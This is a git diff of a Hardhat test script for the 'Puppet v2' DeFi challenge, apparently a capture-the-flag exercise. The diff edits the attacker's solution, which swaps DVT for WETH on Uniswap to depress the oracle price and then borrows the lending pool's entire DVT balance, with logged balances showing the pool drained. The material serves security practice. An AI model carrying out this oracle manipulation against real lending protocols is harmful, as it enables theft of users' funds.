@@ -98,6 +98,9 @@ describe('[Challenge] Puppet v2', function () {
 
       const lendingPoolDVTBalance = await this.token.balanceOf(this.lendingPool.address)
       console.log('LendingPool DVT: ', ethers.utils.formatEther(lendingPoolDVTBalance))
+
+      const lendingPoolWETHBalance = await this.lendingPool.deposits(attacker.address)
+      console.log('LendingPool ETH: ', ethers.utils.formatEther(lendingPoolWETHBalance))
     }
     const attackerCallLendingPool = this.lendingPool.connect(attacker)
     const attackerCallUniswap = this.uniswapRouter.connect(attacker)
@@ -108,18 +111,18 @@ describe('[Challenge] Puppet v2', function () {
     // Attacker ETH:  20.0
     // Attacker WETH:  0.0
     // Attacker DVT:  10000.0
-    // Uniswap WETH:  100.0
+    // Uniswap WETH:  10.0
     // Uniswap DVT:  100.0
     // LendingPool DVT:  1000000.0
 
     // 授权 uniswap 支配 attacker 的 DVT token
     await attackerCallToken.approve(attackerCallUniswap.address, ATTACKER_INITIAL_TOKEN_BALANCE)
 
-    // 在 uniswap 中使用 DVT 兑换 ETH
+    // 在 uniswap 中使用 DVT 兑换 WETH
     await attackerCallUniswap.swapExactTokensForTokens(
-      ATTACKER_INITIAL_TOKEN_BALANCE, // transfer exactly 10,000 tokens
-      ethers.utils.parseEther('9'), // minimum of 9 WETH return
-      [attackerCallToken.address, attackerCallWETH.address], // token addresses
+      ATTACKER_INITIAL_TOKEN_BALANCE,
+      ethers.utils.parseEther('9'),
+      [attackerCallToken.address, attackerCallWETH.address],
       attacker.address,
       (await ethers.provider.getBlock('latest')).timestamp * 2
     )
@@ -145,6 +148,14 @@ describe('[Challenge] Puppet v2', function () {
     await attackerCallLendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {
       gasLimit: 1e6
     })
+
+    // Attacker ETH:  0.099518462674923535
+    // Attacker WETH:  0.304200300864247036
+    // Attacker DVT:  1000000.0
+    // Uniswap WETH:  0.099304865938430984
+    // Uniswap DVT:  10100.0
+    // LendingPool DVT:  0.0
+    printBalance()
   })
 
   after(async function () {
